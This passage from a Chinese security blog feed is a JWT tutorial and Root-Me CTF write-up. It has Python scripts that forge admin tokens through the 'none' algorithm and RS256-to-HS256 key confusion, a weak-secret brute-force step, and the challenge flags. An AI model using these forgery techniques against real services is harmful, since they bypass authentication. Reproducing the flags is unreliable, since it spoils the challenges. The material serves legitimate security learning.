<h4 id="Payload-有效载荷"><a href="#Payload-有效载荷" class="headerlink" title="Payload(有效载荷)"></a>Payload(有效载荷)</h4><p>​    主体信息(有效载荷)，其中包含声明，声明是有关实体(一般是用户)和其他数据的声明。索赔有以下三种类型：</p>
<p>注册的，公共的和私人权利</p>
<ul>
<li><p>已注册的权利要求：</p>
<p>  ​    这些是一组非强制性的但建议使用的预定义权利要求，以提供一组有用的可互操作的权利要求。其中一些是： <strong>iss</strong>(主题)， <strong>exp</strong>(到期时间)， <strong>sub</strong>(主题)， <strong>aud</strong>(受众)等。</p>
</li>
<li><p>公开声明：</p>
<p>  ​    使用JWT的人员可以随意定义这些声明。但为避免冲突，应在<strong>IANA JSON Web令牌注册表</strong>中定义它们，或将其定义为包含抗冲突名称空间的URI。</p>
</li>
<li><p>私人权利：</p>
<p>  ​    这些都是使用它们同意并既不是当事人之间建立共享信息的自定义声明<em>注册</em>或<em>公众</em>的权利要求。</p>
<p>  ​        </p>
<p>  官方规定的七个字段(不强制要求选择，也可以自定义字段)</p>
<ul>
<li><strong>iss (issuer)：签发人</strong></li>
<li><strong>exp (expiration time)：过期时间</strong></li>
<li><strong>sub (subject)：主题</strong></li>
<li><strong>aud (audience)：受众</strong></li>
<li><strong>nbf (Not Before)：生效时间</strong></li>
<li><strong>iat (Issued At)：签发时间</strong></li>
<li><strong>jti (JWT ID)：编号</strong></li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload &#x3D; &#39;&#123;</span><br><span class="line">	&quot;loggedInAs&quot;:&quot;admin&quot;,</span><br><span class="line">	&quot;iat&quot;:1422779638</span><br><span class="line">	&#125;&#39;&#x2F;&#x2F;iat表示令牌生成的时间</span><br><span class="line"></span><br><span class="line">使用base64URL编码，形成JWT的第二部分</span><br></pre></td></tr></table></figure>

<h4 id="Signature-签名"><a href="#Signature-签名" class="headerlink" title="Signature(签名)"></a>Signature(签名)</h4><p>​    签名，要创建签名部分，您必须获取编码的标头，编码的有效载荷，机密，标头中指定的算法，并对其进行签名。</p>
<p>​    如果要使用HMAC SHA256算法，则将通过以下方式创建签名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line"> #第一部分</span><br><span class="line">  base64UrlEncode(header) + &quot;.&quot; +</span><br><span class="line"> #第二部分</span><br><span class="line">  base64UrlEncode(payload),</span><br><span class="line"> #秘钥</span><br><span class="line">  secret)</span><br><span class="line">  </span><br><span class="line"> 使用base64Url编码后组成第三部分</span><br><span class="line"> </span><br><span class="line"> 最后将第一部分.第二部分.第三部分使用.连接组成一段完整的JWT令牌</span><br></pre></td></tr></table></figure>



<h3 id="0x03-Python生成jwt-web-token"><a href="#0x03-Python生成jwt-web-token" class="headerlink" title="0x03 Python生成jwt web token"></a>0x03 Python生成jwt web token</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line"><span class="comment">#头信息</span></span><br><span class="line">head = &#123;</span><br><span class="line">    <span class="string">"alg"</span>:<span class="string">"HS256"</span>,</span><br><span class="line">    <span class="string">"typ"</span>:<span class="string">"jwt"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#payload</span></span><br><span class="line">payloda = &#123;</span><br><span class="line">    <span class="string">"iat"</span>:time.time(),</span><br><span class="line">    <span class="string">"name"</span>:<span class="string">"admin"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#调用jwt库，生成json web token</span></span><br><span class="line"><span class="comment">#							 秘钥      加密算法</span></span><br><span class="line">jwt_token = jwt.encode(payload,<span class="string">"1121"</span>,algorithm=<span class="string">"HS256"</span>,headers=head).decode(<span class="string">'ascii'</span>)</span><br><span class="line"><span class="comment">#输出</span></span><br><span class="line">print(jwt_token)</span><br></pre></td></tr></table></figure>

<p>生成的token</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJqd3QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE1OTUwNzM1NDguNjcyNzk2LCJuYW1lIjoiYWRtaW4ifQ.m_f32qmeuFTCugdPBfMA1jGmpkXWoI3Vjt-sY30_xrw</span><br></pre></td></tr></table></figure>

<h3 id="0x04-Python解密JWT"><a href="#0x04-Python解密JWT" class="headerlink" title="0x04 Python解密JWT"></a>0x04 Python解密JWT</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line"><span class="comment">#需要解码的token</span></span><br><span class="line">jwt_token = <span class="string">"eyJ0eXAiOiJqd3QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE1OTUwNzM1NDguNjcyNzk2LCJuYW1lIjoiYWRtaW4ifQ.m_f32qmeuFTCugdPBfMA1jGmpkXWoI3Vjt-sY30_xrw"</span></span><br><span class="line"></span><br><span class="line">data = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment">#							 秘钥</span></span><br><span class="line">    data = jwt.decode(jwt_token,<span class="string">"1121"</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    print(e)</span><br><span class="line"></span><br><span class="line">print(data)</span><br></pre></td></tr></table></figure>

<p>解密内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#39;iat&#39;: 1595073548.672796, &#39;name&#39;: &#39;admin&#39;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="0x05-攻击手法"><a href="#0x05-攻击手法" class="headerlink" title="0x05 攻击手法"></a>0x05 攻击手法</h3><h4 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h4><p>因header和payload部分是使用可逆的base64方法编码，所以只要获取到令牌就可以将前两个部分解密后读取内容。</p>
<p>解密方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Linux base64 </span><br><span class="line">	echo eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9 | base64 -d</span><br><span class="line"> 		&#123;&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;HS256&quot;&#125;</span><br><span class="line"></span><br><span class="line">浏览器JavaScript控制台</span><br><span class="line">	atob(&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9&quot;)</span><br><span class="line"> 		&quot;&#123;&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;HS256&quot;&#125;&quot;</span><br><span class="line"></span><br><span class="line">Powershell</span><br><span class="line">	[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String</span><br><span class="line">	(&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9&quot;))</span><br><span class="line">		&#123;&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;HS256&quot;&#125;</span><br><span class="line">		</span><br><span class="line">Python</span><br><span class="line">	import base64</span><br><span class="line">	print(base64.b64decode(&#39;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9&#39;))</span><br><span class="line">		&#123;&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;HS256&quot;&#125;</span><br></pre></td></tr></table></figure>



<h4 id="修改签名算法-none"><a href="#修改签名算法-none" class="headerlink" title="修改签名算法(none)"></a>修改签名算法(none)</h4><p>JWT签名算法可确保JWT在传输过程中不会被恶意用户所篡改，但头部的alg字段可以改为none，若服务器支持签名算法为none，服务器会在JWT中删除相应的签名数据（这时，JWT就会只含有头部 + ‘.’ + 有效载荷 + ‘.’），然后将其提交给服务器。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">源码：https:&#x2F;&#x2F;github.com&#x2F;Sjord&#x2F;jwtdemo</span><br><span class="line">dmeo：http:&#x2F;&#x2F;demo.sjoerdlangkemper.nl&#x2F;jwtdemo&#x2F;hs256.php</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxfipcuumj319x0bzabr.jpg" alt="image-20200720143830616"></p>
<p>发送上面的JWT令牌</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxfk7d7myj30re0jx409.jpg" alt="image-20200720143958715"></p>
<p>将alg修改为none</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line"><span class="comment">#头信息</span></span><br><span class="line">head = &#123;</span><br><span class="line">    <span class="string">"alg"</span>:<span class="string">"none"</span>,</span><br><span class="line">    <span class="string">"typ"</span>:<span class="string">"jwt"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#payload</span></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">"iat"</span>:time.time(),</span><br><span class="line">    <span class="string">"name"</span>:<span class="string">"time"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#调用jwt库，生成json web token</span></span><br><span class="line">jwt_token = jwt.encode(payload,<span class="string">""</span>,algorithm=<span class="string">"none"</span>,headers=head).decode(<span class="string">'ascii'</span>)</span><br><span class="line"><span class="comment">#输出</span></span><br><span class="line">print(jwt_token)</span><br><span class="line"></span><br><span class="line"><span class="comment">#生成令牌</span></span><br><span class="line"><span class="comment">#eyJ0eXAiOiJqd3QiLCJhbGciOiJub25lIn0.eyJpYXQiOjE1OTUyMjgwNzEuNjk0MjQ1LCJuYW1lIjoidGltZSJ9.</span></span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxfzr7t71j30pr0gcgn0.jpg" alt="image-20200720145455991"></p>
<h4 id="修改RS256算法为HS256"><a href="#修改RS256算法为HS256" class="headerlink" title="修改RS256算法为HS256"></a>修改RS256算法为HS256</h4><p>HS256算法使用密钥为所有消息进行签名和验证，而RS256算法则使用私钥对消息进行签名并使用公钥进行身份验证。如果将算法从RS256改为HS256，则后端代码将使用公钥作为密钥，然后使用HS256算法验证签名。由于攻击者有时可以获取公钥，因此，攻击者可以将头部中的算法修改为HS256，然后使用RSA公钥对数据进行签名。这样的话，后端代码使用RSA公钥+HS256算法进行签名验证。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">demo:http:&#x2F;&#x2F;demo.sjoerdlangkemper.nl&#x2F;jwtdemo&#x2F;rs256.php</span><br><span class="line">公钥：http:&#x2F;&#x2F;demo.sjoerdlangkemper.nl&#x2F;jwtdemo&#x2F;public.pem</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxj6ohnsgj30xn09rgmr.jpg" alt="image-20200720164522770"></p>
<p>获取网站公钥，将算法改为HS256然后使用泄露的公钥进行签名，服务器会使用HS256和泄露的公钥进行验证。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">key = [</span><br><span class="line">    <span class="string">"-----BEGIN PUBLIC KEY-----"</span>,</span><br><span class="line">    <span class="string">"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqi8TnuQBGXOGx/Lfn4JF"</span>,</span><br><span class="line">    <span class="string">"NYOH2V1qemfs83stWc1ZBQFCQAZmUr/sgbPypYzy229pFl6bGeqpiRHrSufHug7c"</span>,</span><br><span class="line">    <span class="string">"1LCyalyUEP+OzeqbEhSSuUss/XyfzybIusbqIDEQJ+Yex3CdgwC/hAF3xptV/2t+"</span>,</span><br><span class="line">    <span class="string">"H6y0Gdh1weVKRM8+QaeWUxMGOgzJYAlUcRAP5dRkEOUtSKHBFOFhEwNBXrfLd76f"</span>,</span><br><span class="line">    <span class="string">"ZXPNgyN0TzNLQjPQOy/tJ/VFq8CQGE4/K5ElRSDlj4kswxonWXYAUVxnqRN1LGHw"</span>,</span><br><span class="line">    <span class="string">"2G5QRE2D13sKHCC8ZrZXJzj67Hrq5h2SADKzVzhA8AW3WZlPLrlFT3t1+iZ6m+aF"</span>,</span><br><span class="line">    <span class="string">"KwIDAQAB"</span>,</span><br><span class="line">    <span class="string">"-----END PUBLIC KEY-----"</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">key = <span class="string">"\n"</span> . join(key)</span><br><span class="line"></span><br><span class="line">jwt_token = jwt.encode(&#123;<span class="string">"data"</span>:<span class="string">"time"</span>&#125;,algorithm=<span class="string">"HS256"</span>,key=key+<span class="string">"\n"</span>).decode(<span class="string">"ascii"</span>)</span><br><span class="line"></span><br><span class="line">print(jwt_token)</span><br><span class="line"></span><br><span class="line"><span class="comment">#jwt：eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoidGltZSJ9.CAyhfU2pH5L1Ua-bferA4XGvcpwOjxUpG6PkiQ5GYBQ</span></span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxj8782ymj30ok0ca74z.jpg" alt="image-20200720164650350"></p>
<h4 id="破解HS256密钥"><a href="#破解HS256密钥" class="headerlink" title="破解HS256密钥"></a>破解HS256密钥</h4><p>如果HS256密钥的强度较弱的话，攻击者可以直接通过蛮力攻击方式来破解密钥，例如将密钥字符串用作PyJWT库示例代码中的密钥的时候情况就是如此。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">安装pyjwt</span><br><span class="line">	pip3 install pyjwt</span><br><span class="line">爆破脚本</span><br><span class="line">	https:&#x2F;&#x2F;github.com&#x2F;Devllench&#x2F;jwtbrute</span><br><span class="line">字典：</span><br><span class="line">	https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;danielmiessler&#x2F;SecLists&#x2F;master&#x2F;Passwords&#x2F;Common-Credentials&#x2F;10-million-password-list-top-1000000.txt</span><br><span class="line"></span><br><span class="line">命令格式：</span><br><span class="line">	python jwtbrute.py  回车</span><br><span class="line">	input token: jwt令牌</span><br><span class="line">	input wordlist: 字典</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxp0e1tcyj30mw02n0sw.jpg" alt="image-20200720200655836"></p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxp1r8842j30my0dk40u.jpg" alt="image-20200720200814835"></p>
<h3 id="0x06-CTF练习"><a href="#0x06-CTF练习" class="headerlink" title="0x06 CTF练习"></a>0x06 CTF练习</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">练习地址：</span><br><span class="line">https:&#x2F;&#x2F;www.root-me.org&#x2F;?page&#x3D;recherche&amp;lang&#x3D;fr&amp;recherche&#x3D;jwt</span><br></pre></td></tr></table></figure>

<h4 id="JSON-Web-Token-JWT-Introduction"><a href="#JSON-Web-Token-JWT-Introduction" class="headerlink" title="JSON Web Token (JWT) - Introduction"></a>JSON Web Token (JWT) - Introduction</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">题目：</span><br><span class="line">http:&#x2F;&#x2F;challenge01.root-me.org&#x2F;web-serveur&#x2F;ch58&#x2F;</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggvdtp8enyj30xp0esabd.jpg" alt="image-20200718200846778"></p>
<p>尝试登陆抓包，没有获取到任何有用信息，发现登陆框有个黄色的login as guest，点击抓包放包后返回一串JWT令牌信息</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggx9df6btdj30rm0c7q4z.jpg" alt="image-20200720110552172"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.OnuZnYMdetcg7AWGV6WURn8CFSfas6AQej4V9M13nsk</span><br></pre></td></tr></table></figure>

<p>去jwt.io网站解密</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggx9plgyotj30y60jtjth.jpg" alt="image-20200720111733732"></p>
<p>发现有效载荷的用户是guest，所以尝试一波改成admin能行不，但如果修改用户为admin，需要重新生成一下令牌，而现在不知道密钥，可以尝试爆破一波，看看是否能爆破出来。没有爆出来，就有点难受了。。。</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxpe5j9vcj30nf0ciq5e.jpg" alt="image-20200720202009464"></p>
<p>尝试修改签名算法，由于jwt.io不支持none算法，所以使用python生成</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">jwt_token = jwt.encode(&#123;<span class="string">"username"</span>:<span class="string">"admin"</span>&#125;, algorithm=<span class="literal">None</span>,key=<span class="literal">None</span>).decode(<span class="string">"ascii"</span>)</span><br><span class="line">print(jwt_token)</span><br><span class="line"></span><br><span class="line"><span class="comment">#eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.</span></span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxpkcrasmj30i40310sy.jpg" alt="image-20200720202607012"></p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxpnp4es4j30rb0h2tca.jpg" alt="image-20200720202919816"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag : S1gn4tuR3_v3r1f1c4t10N_1S_1MP0Rt4n7</span><br></pre></td></tr></table></figure>



<h4 id="RootMe的JSON-Web-Token-JWT-Weak-secret"><a href="#RootMe的JSON-Web-Token-JWT-Weak-secret" class="headerlink" title="RootMe的JSON Web Token (JWT) - Weak secret"></a>RootMe的JSON Web Token (JWT) - Weak secret</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">题目：http:&#x2F;&#x2F;challenge01.root-me.org&#x2F;web-serveur&#x2F;ch59&#x2F;hello</span><br></pre></td></tr></table></figure>

<p>打开网站后得到一段提示</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxprp99vmj319304raba.jpg" alt="image-20200720203310610"></p>
<p>网翻后。。</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxpsti4csj30vg0363z1.jpg" alt="image-20200720203415144"></p>
<p>先访问/token</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxptovdl3j311m03uwfj.jpg" alt="image-20200720203505773"></p>
<p>得到令牌</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.4kBPNf7Y6BrtP-Y3A-vQXPY9jAh_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKGgO3dBYbhblaPQsbeClcw</span><br></pre></td></tr></table></figure>

<p>然后使用post方式访问/admin</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxpvx0sebj30r508ydh6.jpg" alt="image-20200720203713901"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">添加Authorization: Bearer YOURTOKEN字段</span><br><span class="line">在请求中添加获取到的令牌</span><br><span class="line"></span><br><span class="line">Authorization: Bearer  eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.4kBPNf7Y6BrtP-Y3A-vQXPY9jAh_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKGgO3dBYbhblaPQsbeClcw</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxq9b91uqj30r40b7gno.jpg" alt="image-20200720205006225"></p>
<p>提示爆破。。。</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxpzgu8y1j30lx0cxtav.jpg" alt="image-20200720204038201"></p>
<p>成功 key是lol</p>
<p>然后去jwt.io生成令牌</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxq3jxmx2j30yw0isq55.jpg" alt="image-20200720204434250"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiYWRtaW4ifQ.y9GHxQbH70x_S8F_VPAjra_S-nQ9MsRnuvwWFGoIyKXKk8xCcMpYljN190KcV1qV6qLFTNrvg4Gwyv29OCjAWA</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxq7zw0kgj30qy0bfwgg.jpg" alt="image-20200720204850352"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag: PleaseUseAStrongSecretNextTime</span><br></pre></td></tr></table></figure>



<h4 id="RootMe-JSON-Web-Token-JWT-Public-key"><a href="#RootMe-JSON-Web-Token-JWT-Public-key" class="headerlink" title="RootMe JSON Web Token (JWT) - Public key"></a>RootMe JSON Web Token (JWT) - Public key</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">题目：</span><br><span class="line">	http:&#x2F;&#x2F;challenge01.root-me.org&#x2F;web-serveur&#x2F;ch60&#x2F;</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxqgev14ej30op05j74r.jpg" alt="image-20200720205202880"></p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxqc9md4tj30d306taae.jpg" alt="image-20200720205256815"></p>
<p>首先查看key,貌似很熟悉，就是我们刚刚说过的修改RS256为HS256算法，直接上脚本</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxqcn4u45j319l0660uq.jpg" alt="image-20200720205318430"></p>
<p>然后使用post方式访问/auth</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxqgftgz2j30rc07zmyp.jpg" alt="image-20200720205628778"></p>
<p>提示需要添加username字段</p>
<p>成功获取token</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxqh8dc3lj30ri0a1mzf.jpg" alt="image-20200720205743206"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6InRpbWUifQ.AWLoeQgDwlTs5q2_32D0rjfKjDJXmUo6r31VVireLpuWaIo3y_xJFHXAGeDhP9l2f1TSDDLO-5o-vIp3Fb9zacQUIw4ZdBcFxSobbHHYxsxuaMhH4kVsgWU1Pg5DRAgufA3c-evuq54byYWWRMgod4P-icMZxkJ1vLxCget5xLIE62qyFBkG4nK6oszmg_wkzK-O5PMUtC_eitO9PAVdR-2JcSSV8tSITEmoBzAK90RGqKQ1sBbm29xtStkZr2TsNo1NT2lrnzaROCO46uQEC7RWbA6kf37oZOF2JOVKQLTnHsobXKPrtKs7MvLwjXkJ1rM3mpvv9ZAE2ePJ7ByBpQ</span><br></pre></td></tr></table></figure>

<p>RS256算法</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxqiejyblj30zc0kojvi.jpg" alt="image-20200720205850313"></p>
<p>脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">key = [</span><br><span class="line">        <span class="string">"-----BEGIN PUBLIC KEY-----"</span>,</span><br><span class="line">        <span class="string">"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwInLJZXYC/eZ5BbRDrd0"</span>,</span><br><span class="line">        <span class="string">"+IKB7Hc9u/tjZFVGmS6aVW4MSEzkgdJYx5tM9yEc4XGdKy2JJVmZCogya4xvYdC7"</span>,</span><br><span class="line">        <span class="string">"RDqsZLPYlBIoG7KAWjJA6VR4YBcv+2TyamSiYVgXC9p6oe4kvg23lfGB74i8lPZ3"</span>,</span><br><span class="line">        <span class="string">"13Er2Ohj1L1mEBEl1lMDiCHTBCOyCWnsnZJcUWeZcUxCJBimF4RNS5x/H3cs/uVg"</span>,</span><br><span class="line">        <span class="string">"A+f5XM0XW6Fp6WIN/wZmIwBE58LWRM3LRZAY2r+JQ2Zp47tmNkr3Z5Ifk2hLKbjx"</span>,</span><br><span class="line">        <span class="string">"VOjVi86qKnloXfW5Y18M2qFWnwIWvtIJBFN4og8Ms4XVOB9HudyUiblkywZzSq9D"</span>,</span><br><span class="line">        <span class="string">"NwIDAQAB"</span>,</span><br><span class="line">        <span class="string">"-----END PUBLIC KEY-----"</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">key = <span class="string">"\n"</span> . join(key)</span><br><span class="line"></span><br><span class="line">jwt_token = jwt.encode(&#123;<span class="string">"username"</span>:<span class="string">"admin"</span>&#125;,key=key+<span class="string">"\n"</span>,algorithm=<span class="string">"HS256"</span>).decode(<span class="string">"ascii"</span>)</span><br><span class="line">print(jwt_token)</span><br><span class="line"></span><br><span class="line"><span class="comment">#eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.qZzbNQNfGLSyuvwhb1mKJhBnr3tFHJriIMuxzNEYoG0</span></span><br><span class="line"></span><br><span class="line">PS:如果报错，使用如下命令解决</span><br><span class="line">    卸载pyjwt</span><br><span class="line">    	pip uninstall pyjwt</span><br><span class="line">    安装旧版本pyjwt</span><br><span class="line">    	pip install pyjwt==<span class="number">0.4</span><span class="number">.3</span></span><br></pre></td></tr></table></figure>

<p>访问/admin目录使用post方式添加内容到cookie中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.qZzbNQNfGLSyuvwhb1mKJhBnr3tFHJriIMuxzNEYoG0</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggxr1juwxgj30rt0ciq4w.jpg" alt="image-20200720211714909"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag : HardcodeYourAlgoBro</span><br></pre></td></tr></table></figure>

<h3 id="0x07-参考链接"><a href="#0x07-参考链接" class="headerlink" title="0x07 参考链接"></a>0x07 参考链接</h3><p><a href="https://www.jianshu.com/p/c5f2a4e1c98d" target="_blank" rel="noopener">https://www.jianshu.com/p/c5f2a4e1c98d</a></p>
<p><a href="http://sircoding.club/blog/post/sirc0de/JWT" target="_blank" rel="noopener">http://sircoding.club/blog/post/sirc0de/JWT</a></p>
<p><a href="http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html</a></p>
<p><a href="https://jwt.io/introduction/" target="_blank" rel="noopener">https://jwt.io/introduction/</a></p>
]]></content>
      <categories>
        <category>jwt</category>
      </categories>
      <tags>
        <tag>会话传递</tag>
      </tags>
  </entry>
  <entry>
    <title>xyhcms审计学习</title>
    <url>/2020/06/22/xyhcms%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gg1fkbbv1pj31c00u0qae.jpg" alt="86"></p>
<a id="more"></a>

<h3 id="0x00-CMS核心目录"><a href="#0x00-CMS核心目录" class="headerlink" title="0x00 CMS核心目录"></a>0x00 CMS核心目录</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">网站使用框架：Thinkphp</span><br><span class="line">App		应用目录</span><br><span class="line">data	网站上传配置、编辑器目录</span><br><span class="line">include	网站配置调式目录</span><br><span class="line">install	安装目录</span><br><span class="line">public	公共目录</span><br><span class="line">uploads	上传目录</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>xycms审计</title>
    <url>/2020/08/10/xycms%E5%AE%A1%E8%AE%A1/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ghltgt2lgfj31hc0u0qnl.jpg" alt=""></p>
<a id="more"></a>]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>微信小程序反编译获取源码</title>
    <url>/2020/06/05/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8F%8D%E7%BC%96%E8%AF%91%E8%8E%B7%E5%8F%96%E6%BA%90%E7%A0%81/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gfhjpjtj5yj318z0u0na0.jpg" alt="51"></p>
<a id="more"></a>

<h3 id="0x00-环境搭建"><a href="#0x00-环境搭建" class="headerlink" title="0x00 环境搭建"></a>0x00 环境搭建</h3><p>1、Nodejs</p>
<p>​        下载连接: <a href="https://nodejs.org/zh-cn/download/" target="_blank" rel="noopener">https://nodejs.org/zh-cn/download/</a> </p>
<p>​        安装成功后，在系统中配置环境变量即可，运行node -v，如下图说明安装成功</p>
